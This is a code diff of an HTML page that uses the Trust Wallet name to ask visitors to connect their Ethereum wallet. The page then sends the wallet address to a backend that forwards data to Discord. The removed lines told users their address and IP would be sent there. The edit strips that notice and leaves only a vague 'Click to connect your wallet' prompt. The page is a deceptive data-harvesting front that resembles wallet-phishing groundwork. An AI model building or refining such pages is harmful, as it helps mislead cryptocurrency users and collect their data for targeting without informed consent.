@@ -1,201 +1,106 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Trust Wallet Connect</title>
-    <meta charset="UTF-8">
+    <title>Trust Wallet</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        * {
+        body {
+            background: black;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             font-family: Arial, sans-serif;
         }
         
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
         .container {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
-            max-width: 500px;
-            width: 100%;
+            color: white;
         }
         
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-        
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-        }
-        
-        .wallet-btn {
+        .connect-btn {
             background: #1B1B1B;
             color: white;
-            border: none;
+            border: 2px solid #666;
             padding: 20px 40px;
             font-size: 18px;
             font-weight: bold;
-            border-radius: 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin: 30px auto;
-            width: 100%;
-            transition: all 0.3s;
-        }
-        
-        .wallet-btn:hover {
-            background: #333;
-            transform: translateY(-2px);
-        }
-        
-        .wallet-btn i {
-            font-size: 24px;
-        }
-        
-        .status {
-            background: #f8f9fa;
-            padding: 20px;
             border-radius: 10px;
+            cursor: pointer;
+            margin-top: 30px;
+        }
+        
+        .connect-btn:hover {
+            background: #333;
+        }
+        
+        #status {
             margin-top: 20px;
             font-size: 14px;
-        }
-        
-        #walletAddress {
-            font-family: monospace;
-            background: #e9ecef;
-            padding: 8px 12px;
-            border-radius: 6px;
-            margin-top: 10px;
-            display: none;
-        }
-        
-        .success {
-            color: #28a745;
-            font-weight: bold;
-        }
-        
-        .error {
-            color: #dc3545;
-            font-weight: bold;
+            color: #ccc;
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
     <div class="container">
-        <h1><i class="fas fa-wallet"></i> Trust Wallet Connect</h1>
-        <p class="subtitle">Connect your wallet to send info to Discord</p>
+        <h1>Trust Wallet Connect</h1>
+        <p>Click to connect your wallet</p>
         
-        <button class="wallet-btn" onclick="connectWallet()" id="connectBtn">
-            <i class="fas fa-plug"></i>
-            Connect Trust Wallet
+        <button class="connect-btn" onclick="connectWallet()" id="btn">
+            Connect Wallet
         </button>
         
-        <div class="status">
-            <p>Status: <span id="status">Click button above to connect</span></p>
-            <p id="walletAddress"></p>
-        </div>
-        
-        <div style="margin-top: 30px; padding: 15px; background: #e3f2fd; border-radius: 10px;">
-            <p><i class="fas fa-info-circle"></i> <strong>How it works:</strong></p>
-            <p style="margin-top: 10px; font-size: 14px;">
-                1. Click "Connect Trust Wallet"<br>
-                2. Approve in Trust Wallet app<br>
-                3. Wallet address & IP sent to Discord automatically
-            </p>
-        </div>
+        <div id="status"></div>
     </div>
 
     <script>
         async function connectWallet() {
-            const btn = document.getElementById('connectBtn');
+            const btn = document.getElementById('btn');
             const status = document.getElementById('status');
             
-            // Check if Trust Wallet is installed
-            if (typeof window.ethereum === 'undefined') {
-                status.innerHTML = '<span class="error">❌ Trust Wallet not detected! Install Trust Wallet app.</span>';
+            if (!window.ethereum) {
+                status.innerHTML = "Install Trust Wallet";
                 return;
             }
             
             try {
                 btn.disabled = true;
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
-                status.innerHTML = '🔄 Requesting connection...';
+                btn.textContent = "Connecting...";
+                status.innerHTML = "Waiting for approval...";
                 
-                // Request wallet connection
+                // Connect wallet
                 const accounts = await window.ethereum.request({
                     method: 'eth_requestAccounts'
                 });
                 
-                if (accounts.length > 0) {
-                    const walletAddress = accounts[0];
+                if (accounts[0]) {
+                    const wallet = accounts[0];
+                    status.innerHTML = "Connected! Sending data...";
                     
-                    // Show wallet address
-                    document.getElementById('walletAddress').style.display = 'block';
-                    document.getElementById('walletAddress').innerHTML = 
-                        `<strong>Connected:</strong> ${walletAddress.substring(0, 6)}...${walletAddress.substring(walletAddress.length - 4)}`;
-                    
-                    status.innerHTML = '✅ Connected! Sending to Discord...';
-                    
-                    // Send to Discord via backend
-                    const response = await fetch(`/send-to-discord?wallet=${walletAddress}`);
+                    // Send to server
+                    const response = await fetch(`/send?wallet=${wallet}`);
                     const result = await response.json();
                     
                     if (result.success) {
-                        status.innerHTML = '<span class="success">✅ Success! Data sent to Discord.</span>';
-                        btn.innerHTML = '<i class="fas fa-check"></i> Connected';
-                        btn.style.background = '#28a745';
-                        
-                        // Show success message
-                        setTimeout(() => {
-                            alert('✅ Success!\n\nWallet address and IP sent to Discord webhook.');
-                        }, 500);
+                        status.innerHTML = "✅ Data sent to Discord";
+                        btn.textContent = "Connected";
+                        btn.style.background = "#28a745";
+                        btn.style.borderColor = "#28a745";
                     } else {
-                        status.innerHTML = `<span class="error">❌ Failed to send: ${result.error || 'Unknown error'}</span>`;
+                        status.innerHTML = "Failed to send";
                         btn.disabled = false;
-                        btn.innerHTML = '<i class="fas fa-plug"></i> Try Again';
+                        btn.textContent = "Try Again";
                     }
                 }
                 
             } catch (error) {
-                console.error('Connection error:', error);
-                
-                if (error.code === 4001) {
-                    status.innerHTML = '<span class="error">❌ Connection rejected by user</span>';
-                } else {
-                    status.innerHTML = `<span class="error">❌ Error: ${error.message}</span>`;
-                }
-                
+                status.innerHTML = "Error: " + error.message;
                 btn.disabled = false;
-                btn.innerHTML = '<i class="fas fa-plug"></i> Connect Trust Wallet';
+                btn.textContent = "Connect Wallet";
             }
         }
-        
-        // Auto-connect if returning from Trust Wallet
-        window.onload = function() {
-            // Check if wallet is already connected
-            if (window.ethereum && window.ethereum.selectedAddress) {
-                document.getElementById('status').innerHTML = '🔄 Already connected, sending data...';
-                connectWallet();
-            }
-        };
     </script>
 </body>
 </html>
